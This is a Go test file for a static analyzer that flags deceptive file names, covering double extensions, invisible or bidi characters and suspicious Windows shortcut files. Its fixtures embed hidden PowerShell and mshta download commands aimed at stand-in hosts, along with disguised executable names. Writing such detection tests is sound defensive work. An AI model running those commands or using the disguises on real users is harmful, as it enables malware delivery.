package filename_test

import (
	"cmp"
	"context"
	"slices"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/ident"
	"github.com/mrdhira/galahad/internal/analyze/static/filename"
)

func utf16le(s string) []byte {
	var b []byte
	for _, r := range s {
		b = append(b, byte(r), 0)
	}
	return b
}

func lnkBlob(payload []byte) []byte {
	b := []byte{0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46}
	b = append(b, make([]byte, 20)...)
	return append(b, payload...)
}

func TestAnalyze(t *testing.T) {
	ps := lnkBlob(utf16le("powershell.exe -w hidden -c iwr http://sinkhole.test/p"))
	tests := []struct {
		name string
		// inputs
		file   string
		data   []byte
		dir    string // folder of the file; "dir" when empty
		member bool   // the file is a member of a container
		// expectations
		wantRules   []string
		wantSnippet string // snippet of the first finding
	}{
		{name: "decoy pdf then lnk with powershell", file: "invoice.pdf.lnk", data: ps, wantRules: []string{"GAL-NAME-001", "GAL-NAME-003", "GAL-LNK-001"}, wantSnippet: "invoice.pdf.lnk"},
		{name: "double extension exe", file: "report.docx.exe", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "whitespace padding before the last dot", file: "photo.jpg   .scr", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "trailing dot after the executable extension", file: "invoice.pdf.exe.", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "trailing dots and spaces", file: "invoice.pdf.exe. . ", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "data and markup types are not decoys", file: "express.json.js", data: []byte("x")},
		{name: "html and xml are not decoys", file: "page.html.js", data: []byte("x")},
		{name: "source types are not decoys", file: "index.d.ts.js", data: []byte("x")},
		{name: "mov decoy then exe", file: "holiday.mov.exe", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "rar decoy then vbs", file: "backup.rar.vbs", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "decoy then jar", file: "invoice.pdf.jar", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "script in a test folder is still reported", file: "test.png.js", data: []byte("'use strict'\n"), dir: "test/e2e/image", wantRules: []string{"GAL-NAME-001"}, wantSnippet: "test.png.js"},
		{name: "test folder name is matched ignoring case", file: "invoice.pdf.js", data: []byte("x"), dir: "app/Examples", wantRules: []string{"GAL-NAME-001"}},
		{name: "script member of a container in a test folder is reported", file: "invoice.pdf.js", data: []byte("x"), dir: "mail.eml!/tests", member: true, wantRules: []string{"GAL-NAME-001"}},
		{name: "lnk with a trailing dot", file: "x.lnk.", data: []byte("x"), wantRules: []string{"GAL-NAME-003"}},
		{name: "zero width space padding", file: "invoice.pdf" + string(rune(0x200B)) + ".exe", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "hangul filler padding", file: "invoice.pdf" + string(rune(0x3164)) + ".exe", data: []byte("x"), wantRules: []string{"GAL-NAME-001"}},
		{name: "arabic letter mark in the name", file: "a" + string(rune(0x061C)) + "b.txt", data: []byte("x"), wantRules: []string{"GAL-NAME-002"}},
		{name: "bidi override in the name", file: "invoice\u202efdp.exe", data: []byte("x"), wantRules: []string{"GAL-NAME-002"}, wantSnippet: `invoice\u202efdp.exe`},
		{name: "script host file", file: "run.wsf", data: []byte("x"), wantRules: []string{"GAL-NAME-003"}},
		{name: "url shortcut", file: "go.URL", data: []byte("x"), wantRules: []string{"GAL-NAME-003"}},
		{name: "lnk by magic with an odd extension", file: "thing.dat", data: lnkBlob([]byte("C:\\Windows\\System32\\cmd.exe /c calc")), wantRules: []string{"GAL-NAME-003", "GAL-LNK-001"}},
		{name: "lnk with a url only", file: "link.lnk", data: lnkBlob([]byte("https://sinkhole.test/p")), wantRules: []string{"GAL-NAME-003", "GAL-LNK-001"}},
		{name: "lnk without interpreter or url", file: "docs.lnk", data: lnkBlob(utf16le("C:\\Users\\a\\notes.txt")), wantRules: []string{"GAL-NAME-003"}},
		{name: "tar.gz is not flagged", file: "archive.tar.gz", data: []byte("x")},
		{name: "multi-dot pdf is not flagged", file: "report.final.pdf", data: []byte("x")},
		{name: "exe alone is not flagged", file: "setup.exe", data: []byte("x")},
		{name: "executable then decoy is not flagged", file: "tool.exe.txt", data: []byte("x")},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			a := filename.New()
			dir := cmp.Or(tt.dir, "dir")
			f := analyze.File{Path: dir + "/" + tt.file, Name: tt.file, Kind: ident.Identify(tt.file, tt.data), Data: tt.data}
			if tt.member {
				f.Member = "tests/" + tt.file
			}

			out, err := a.Analyze(context.Background(), f)

			if err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, fd := range out.Findings {
				got = append(got, fd.RuleID)
				if fd.Evidence[0].Path != f.Path {
					t.Errorf("%s evidence path = %q, want %q", fd.RuleID, fd.Evidence[0].Path, f.Path)
				}
			}
			if !slices.Equal(got, tt.wantRules) {
				t.Fatalf("rules = %v, want %v", got, tt.wantRules)
			}
			if tt.wantSnippet != "" && out.Findings[0].Evidence[0].Snippet != tt.wantSnippet {
				t.Errorf("snippet = %q, want %q", out.Findings[0].Evidence[0].Snippet, tt.wantSnippet)
			}
		})
	}
}

func TestRuleMetadata(t *testing.T) {
	tests := []struct {
		name       string
		file       string
		data       []byte
		dir        string
		member     bool
		wantSev    map[string]string
		wantAttack map[string]string
	}{
		{
			name: "double extension and lnk", file: "a.pdf.lnk", data: lnkBlob([]byte("mshta http://x.test/a")),
			wantSev:    map[string]string{"GAL-NAME-001": "critical", "GAL-NAME-003": "medium", "GAL-LNK-001": "high"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007", "GAL-NAME-003": "T1204.002", "GAL-LNK-001": "T1059"},
		},
		{
			name: "text script in a test folder is graded lower", file: "test.png.js", data: []byte("'use strict'\n"), dir: "test/e2e",
			wantSev:    map[string]string{"GAL-NAME-001": "medium"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007"},
		},
		{
			name: "top-level script is critical", file: "invoice.pdf.js", data: []byte("x"),
			wantSev:    map[string]string{"GAL-NAME-001": "critical"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007"},
		},
		{
			name: "script in a container is critical", file: "invoice.pdf.js", data: []byte("x"), dir: "mail.eml!/tests", member: true,
			wantSev:    map[string]string{"GAL-NAME-001": "critical"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007"},
		},
		{
			name: "script that is not text is critical in a test folder", file: "invoice.pdf.js", data: lnkBlob([]byte("x")), dir: "tests",
			wantSev:    map[string]string{"GAL-NAME-001": "critical", "GAL-NAME-003": "medium"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007", "GAL-NAME-003": "T1204.002"},
		},
		{
			name: "binary executable in a test folder is critical", file: "invoice.pdf.exe", data: []byte("x"), dir: "tests",
			wantSev:    map[string]string{"GAL-NAME-001": "critical"},
			wantAttack: map[string]string{"GAL-NAME-001": "T1036.007"},
		},
		{
			name: "bidi", file: "a\u200fb.txt", data: []byte("x"),
			wantSev:    map[string]string{"GAL-NAME-002": "critical"},
			wantAttack: map[string]string{"GAL-NAME-002": "T1036.002"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: tt.file, Name: tt.file, Kind: ident.Identify(tt.file, tt.data), Data: tt.data}
			if tt.dir != "" {
				f.Path = tt.dir + "/" + tt.file
			}
			if tt.member {
				f.Member = "tests/" + tt.file
			}

			out, err := filename.New().Analyze(context.Background(), f)

			if err != nil {
				t.Fatal(err)
			}
			for _, fd := range out.Findings {
				if string(fd.Severity) != tt.wantSev[fd.RuleID] || fd.Attack != tt.wantAttack[fd.RuleID] {
					t.Errorf("%s = %s %s", fd.RuleID, fd.Severity, fd.Attack)
				}
			}
			if len(out.Findings) != len(tt.wantSev) {
				t.Errorf("%d findings, want %d", len(out.Findings), len(tt.wantSev))
			}
		})
	}
}

func TestName(t *testing.T) {
	tests := []struct {
		name     string
		wantName string
	}{
		{name: "analyzer name", wantName: "filename"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := filename.New().Name(); got != tt.wantName {
				t.Errorf("Name = %q, want %q", got, tt.wantName)
			}
		})
	}
}
